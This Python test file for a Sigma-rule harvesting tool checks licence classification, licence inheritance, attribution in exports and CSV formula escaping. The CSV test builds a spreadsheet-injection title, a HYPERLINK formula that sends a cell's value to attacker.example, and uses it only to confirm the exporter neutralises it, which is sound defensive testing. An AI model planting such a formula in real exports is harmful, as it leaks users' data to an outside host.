"""Licence matching, licence inheritance, sources.yaml precedence, attribution in exports and CSV formula safety."""

from __future__ import annotations

import csv
import gzip
import json
import zipfile
from pathlib import Path

from sqlalchemy import select

from sigharvest.config import SourceConfig, Workspace, load_sources, save_sources
from sigharvest.export import export_csv, export_queries, export_zip, select_groups
from sigharvest.index import GroupFilters, rebuild
from sigharvest.licensing import licence_class, narrows, normalise, redistributable
from sigharvest.models import LogicGroup
from sigharvest.release import build
from sigharvest.service import open_db, sync_all
from tests.test_pipeline import commit, git

DETECTION = """logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\\\\{exe}.exe'
    condition: selection
level: high
"""


def _rule(title: str, uid: str, exe: str, extra: str = "") -> str:
    return f"title: {title}\nid: {uid}\nstatus: test\n{extra}" + DETECTION.format(exe=exe)


def _repo(root: Path, files: dict[str, str]) -> Path:
    root.mkdir(parents=True)
    git(root, "init", "-q", "-b", "main")
    for name, text in files.items():
        (root / name).write_text(text)
    commit(root, "init")
    return root


def _workspace(tmp_path: Path, sources: list[SourceConfig]) -> tuple[Workspace, object]:
    ws = Workspace(tmp_path / "ws")
    ws.root.mkdir()
    save_sources(ws, sources)
    S = open_db(ws, migrate=True)
    assert all(o.status == "ok" for o in sync_all(ws))
    with S() as s:
        rebuild(s)
        s.commit()
    return ws, S


def _rows(folder: Path) -> dict[str, dict[str, object]]:
    with gzip.open(folder / "rules.jsonl.gz", "rt", encoding="utf-8") as fh:
        return {r["title"]: r for r in map(json.loads, fh)}


def _zip_text(path: Path) -> str:
    with zipfile.ZipFile(path) as zf:
        return "\n".join(zf.read(n).decode("utf-8") for n in zf.namelist())


SECRET = _rule(
    "Proprietary Secret Rule",
    "8c2f5e1a-4b7d-4e93-a0c6-1f9d3b8e2a57",
    "evil",
    "description: SECRET TEXT FROM UNLICENSED REPO - must not be redistributed\nauthor: Secret Author\n",
)
SAME_LOGIC_MIT = _rule("Open Copy", "3e7a9c1d-5f2b-4d86-b4e0-9a1c7d3f5e28", "evil", "author: Open Author\n")


def _two_sources(tmp_path: Path) -> tuple[Workspace, object]:
    nolic = _repo(tmp_path / "nolic", {"secret.yml": SECRET})
    mit = _repo(tmp_path / "mit", {"open.yml": SAME_LOGIC_MIT})
    # `sources add nolic URL --priority 10` without --licence: no licence, redistributable not stated.
    return _workspace(
        tmp_path,
        [
            SourceConfig(name="nolic", url=str(nolic), priority=10),
            SourceConfig(name="mit", url=str(mit), licence="MIT", priority=20, redistributable=True),
        ],
    )


# ----------------------------------------------------------------------------- licence matching


def test_drl_is_matched_exactly_not_as_a_substring() -> None:
    for text in (
        "DRL-1.1",
        "DRL 1.1",
        "Detection Rule License 1.1",
        "Detection Rule License (DRL) 1.1",
        "DRL 1.1 https://github.com/SigmaHQ/Detection-Rule-License",
    ):
        assert normalise(text) == "drl-1.1" and licence_class(text) == "permissive", text
    assert normalise("DRL-1.0") == "drl-1.0"
    for text in (
        "proprietary (not DRL)",
        "Not DRL - all rights reserved",
        "DRL 1.0 / commercial",
        "LicenseRef-HDRLabs-Proprietary",
        "Elastic License 2.0 - this is NOT DRL, do not redistribute",
    ):
        assert licence_class(text) == "restricted", text
    assert licence_class("Elastic-2.0") == licence_class("Elastic License 2.0") == "restricted"
    assert licence_class("MIT License") == licence_class("Apache License 2.0") == "permissive"


def test_rule_licence_only_narrows() -> None:
    assert narrows("Elastic-2.0", "MIT") and narrows("GPL-3.0", "MIT")
    assert not narrows("MIT", "Elastic-2.0") and not narrows("MIT", None) and not narrows("DRL-1.1", "LicenseRef-proprietary")
    assert not narrows(None, "MIT")


def test_redistributable_defaults_to_no() -> None:
    assert redistributable(True) and redistributable("true")
    assert not any(redistributable(v) for v in (None, False, "false", "unknown", "no", "False", ""))


def test_rule_license_field_cannot_widen_a_restricted_source(tmp_path: Path) -> None:
    rules = {
        "drl_claim.yml": _rule(
            "Elastic Rule", "6b1d4f8e-2a9c-4e37-b5d0-8c3e1f7a9b24", "a", "license: 'Elastic License 2.0 - this is NOT DRL, do not redistribute'\n"
        ),
        "mit_claim.yml": _rule("Claims MIT", "9f3c7a2e-1d5b-4c80-a6e4-2b8d0f9c3e61", "b", "license: MIT\n"),
    }
    repo = _repo(tmp_path / "elastic", rules)
    _ws, S = _workspace(tmp_path, [SourceConfig(name="elastic", url=str(repo), licence="Elastic-2.0", redistributable=True)])
    with S() as s:
        build(s, tmp_path / "rel", build_epoch=1)
    rows = _rows(tmp_path / "rel")
    for title in ("Elastic Rule", "Claims MIT"):
        assert rows[title]["licence_class"] == "restricted" and rows[title]["yaml"] is None, rows[title]
        assert rows[title]["licence"] == "Elastic-2.0" and rows[title]["licence_from"] == "source elastic"
    assert ".yml" not in " ".join(zipfile.ZipFile(tmp_path / "rel" / "sigharvest-rules-permissive.zip").namelist())


def test_rule_license_field_narrows_a_permissive_source(tmp_path: Path) -> None:
    repo = _repo(tmp_path / "mit", {"r.yml": _rule("Narrowed", "2d8f4b6a-9c1e-4a73-b0d5-7e3a1c9f5b82", "n", "license: Elastic-2.0\n")})
    _ws, S = _workspace(tmp_path, [SourceConfig(name="mit", url=str(repo), licence="MIT", redistributable=True)])
    with S() as s:
        build(s, tmp_path / "rel", build_epoch=1)
    row = _rows(tmp_path / "rel")["Narrowed"]
    assert (row["licence"], row["licence_from"], row["licence_class"], row["yaml"]) == ("Elastic-2.0", "rule", "restricted", None)


# ----------------------------------------------------------------------------- no borrowed licence


def test_unlicensed_canonical_copy_never_borrows_another_sources_licence(tmp_path: Path) -> None:
    _ws, S = _two_sources(tmp_path)
    with S() as s:
        g = s.scalars(select(LogicGroup)).one()
        assert g.canonical_source == "nolic" and sorted(g.sources) == ["mit", "nolic"]
        build(s, tmp_path / "rel", build_epoch=1)
        export_zip(s, select_groups(s, "logic", None, GroupFilters(), None), tmp_path / "export.zip")
    row = _rows(tmp_path / "rel")["Proprietary Secret Rule"]
    assert row["licence"] is None and row["licence_class"] == "none" and row["licence_from"] == "none stated" and row["yaml"] is None
    for name in ("sigharvest-rules-permissive.zip", "sigharvest-rules-copyleft.zip"):
        assert "SECRET TEXT" not in _zip_text(tmp_path / "rel" / name)
    with zipfile.ZipFile(tmp_path / "export.zip") as zf:
        meta = [json.loads(x) for x in zf.read("export/manifest.jsonl").decode().splitlines()]
        assert "SECRET TEXT" not in "".join(zf.read(n).decode() for n in zf.namelist())
        assert "Proprietary Secret Rule" in zf.read("export/SKIPPED.md").decode()
    assert meta == []  # the unlicensed canonical copy is only linked, never shipped under another source's licence


def test_unset_redistributable_ships_metadata_only(tmp_path: Path) -> None:
    repo = _repo(tmp_path / "mit", {"r.yml": _rule("Unstated", "5a9e2c7f-3b1d-4f64-8c0a-e7d2b5f1a936", "u")})
    _ws, S = _workspace(tmp_path, [SourceConfig(name="mit", url=str(repo), licence="MIT")])
    with S() as s:
        m = build(s, tmp_path / "rel", build_epoch=1)
    row = _rows(tmp_path / "rel")["Unstated"]
    assert row["licence_class"] == "permissive" and row["yaml"] is None and m["counts"].get("with_yaml", 0) == 0


def test_sources_add_records_redistributable(tmp_path: Path, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from typer.testing import CliRunner

    from sigharvest.cli import app

    ws = Workspace(tmp_path / "ws")
    ws.root.mkdir()
    save_sources(ws, [])
    monkeypatch.setenv("SIGHARVEST_HOME", str(ws.root))
    runner = CliRunner()
    for args in (
        ["nolic", "https://example.org/a"],
        ["mit", "https://example.org/b", "--licence", "MIT"],
        ["odd", "https://example.org/c", "--licence", "proprietary (not DRL)"],
        ["optout", "https://example.org/d", "--licence", "MIT", "--no-redistributable"],
    ):
        assert runner.invoke(app, ["sources", "add", *args]).exit_code == 0
    assert {c.name: c.redistributable for c in load_sources(ws)} == {"nolic": None, "mit": True, "odd": None, "optout": False}


# ----------------------------------------------------------------------------- sources.yaml wins over the DB copy


def test_release_and_export_use_current_sources_yaml(tmp_path: Path) -> None:
    ws, S = _two_sources(tmp_path)
    with S() as s:
        build(s, tmp_path / "before", build_epoch=1)
    assert "| mit | MIT |" in (tmp_path / "before" / "ATTRIBUTION.md").read_text()
    # mit turns out to be proprietary; no sync/update before the next release or export
    items = load_sources(ws)
    for item in items:
        if item.name == "mit":
            item.licence, item.redistributable = "LicenseRef-proprietary", False
        if item.name == "nolic":
            item.licence, item.redistributable = "MIT", True
    save_sources(ws, items)
    with S() as s:
        build(s, tmp_path / "after", build_epoch=1)
        export_csv(s, select_groups(s, "logic", None, GroupFilters(), None), tmp_path / "rules.csv")
    attribution = (tmp_path / "after" / "ATTRIBUTION.md").read_text()
    assert "| mit | LicenseRef-proprietary |" in attribution and "| nolic | MIT |" in attribution
    row = _rows(tmp_path / "after")["Proprietary Secret Rule"]
    assert row["licence"] == "MIT" and row["licence_from"] == "source nolic" and row["yaml"]
    csv_rows = list(csv.DictReader((tmp_path / "rules.csv").open(encoding="utf-8")))
    assert [r["licence"] for r in csv_rows] == ["MIT"]


# ----------------------------------------------------------------------------- attribution travels with rules


DRL_ROW = "| Attributed Rule | Jane Doe | sigma | [DRL-1.1](https://github.com/SigmaHQ/Detection-Rule-License/blob/main/LICENSE.Detection.Rules.md) |"


def test_query_export_and_zips_carry_attribution(tmp_path: Path) -> None:
    repo = _repo(tmp_path / "drl", {"r.yml": _rule("Attributed Rule", "7c4e1a9f-2d6b-4b38-9e05-a3f8c1d7e249", "x", "author: Jane Doe\n")})
    _ws, S = _workspace(tmp_path, [SourceConfig(name="sigma", url=str(repo), licence="DRL-1.1", redistributable=True)])
    out = tmp_path / "q.splunk"
    with S() as s:
        rep = export_queries(s, select_groups(s, "logic", None, GroupFilters(), None), "splunk", out)
        build(s, tmp_path / "rel", build_epoch=1)
        export_zip(s, select_groups(s, "logic", None, GroupFilters(), None), tmp_path / "export.zip")
    assert rep.written == 1
    text = out.read_text()
    assert "# attribution: Attributed Rule | author: Jane Doe | source: sigma | licence: DRL-1.1 | " in text
    assert text.split("# attribution:", 1)[1].splitlines()[0].endswith("r.yml")  # reference to the original rule
    manifest = [json.loads(x) for x in out.with_name(out.name + ".manifest.jsonl").read_text().splitlines()]
    assert manifest[0]["author"] == "Jane Doe" and manifest[0]["licence"] == "DRL-1.1" and manifest[0]["source_path"] == "r.yml"
    assert DRL_ROW in out.with_name(out.name + ".ATTRIBUTION.md").read_text()
    assert "# attribution:" in out.with_name(out.name + ".NOTICE.md").read_text()
    for path in (tmp_path / "rel" / "sigharvest-rules-permissive.zip", tmp_path / "export.zip"):
        with zipfile.ZipFile(path) as zf:
            top = "export/" if path.name == "export.zip" else ""  # the CLI zip has the web UI's top folder
            assert {top + "ATTRIBUTION.md", top + "manifest.jsonl", top + "NOTICE.md"} <= set(zf.namelist()), path
            assert DRL_ROW in zf.read(top + "ATTRIBUTION.md").decode()


# ----------------------------------------------------------------------------- CSV formula injection


def test_csv_cells_are_not_formulas(tmp_path: Path) -> None:
    title = '=HYPERLINK("http://attacker.example/?leak="&A1,"Click")'
    repo = _repo(tmp_path / "r", {"r.yml": _rule(f"'{title}'", "4f8b2d6e-1a3c-4e97-b5d1-c9e7a2f4b630", "c", "author: '@evil'\n")})
    _ws, S = _workspace(tmp_path, [SourceConfig(name="plus", url=str(repo), licence="+MIT")])
    with S() as s:
        export_csv(s, select_groups(s, "logic", None, GroupFilters(), None), tmp_path / "rules.csv")
    row = next(csv.DictReader((tmp_path / "rules.csv").open(encoding="utf-8")))
    assert row["title"] == "'" + title and row["author"] == "'@evil" and row["licence"] == "'+MIT"
    lines = (tmp_path / "rules.csv").read_text(encoding="utf-8").splitlines()
    assert all(line.startswith('"') and line.endswith('"') for line in lines)  # every cell quoted: never split on ';'
    from sigharvest.export import csv_cell

    assert [csv_cell(v) for v in ("-1+2", "\tx", "\rx", "safe", None, ["=a", "b"])] == ["'-1+2", "'\tx", "'\rx", "safe", "", "'=a b"]


def test_cli_licence_class_filter_matches_the_web_filter(tmp_path: Path, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    """`search`/`export --licence-class` select by the source's licence class, like the web UI's licence facet;
    `--licence` only sees a `license:` field in the rule document, which most rules do not have."""
    from typer.testing import CliRunner

    from sigharvest.cli import app

    mit = _repo(tmp_path / "mit", {"a.yml": _rule("Permissive Rule", "1b2c3d4e-5f60-4718-8a9b-0c1d2e3f4a5b", "alpha")})
    gpl = _repo(tmp_path / "gpl", {"b.yml": _rule("Copyleft Rule", "2c3d4e5f-6071-4829-9bac-1d2e3f4a5b6c", "beta")})
    ws, _S = _workspace(
        tmp_path,
        [
            SourceConfig(name="mit", url=str(mit), licence="MIT", priority=10, redistributable=True),
            SourceConfig(name="gpl", url=str(gpl), licence="GPL-3.0-only", priority=20, redistributable=True),
        ],
    )
    monkeypatch.chdir(ws.root)
    runner = CliRunner()

    def titles(*args: str) -> set[str]:
        result = runner.invoke(app, ["search", "--json", *args])
        assert result.exit_code == 0, result.output
        return {r["title"] for r in json.loads(result.output)["results"]}

    assert titles("--licence-class", "copyleft") == {"Copyleft Rule"}
    assert titles("--licence-class", "PERMISSIVE") == {"Permissive Rule"}
    assert titles("--licence-class", "permissive", "--source", "gpl") == set()
    assert titles("--licence", "MIT") == set()  # no rule document declares `license: MIT`
    bad = runner.invoke(app, ["search", "--licence-class", "free"])
    assert bad.exit_code == 2 and "--licence-class must be one of" in bad.output

    out = tmp_path / "copyleft.jsonl"
    result = runner.invoke(app, ["export", "--licence-class", "copyleft", "--format", "jsonl", "--out", str(out)])
    assert result.exit_code == 0, result.output
    assert [json.loads(line)["title"] for line in out.read_text(encoding="utf-8").splitlines()] == ["Copyleft Rule"]
    refused = runner.invoke(app, ["export", "--licence-class", "copyleft", "--unit", "all", "--out", str(tmp_path / "x")])
    assert refused.exit_code == 2
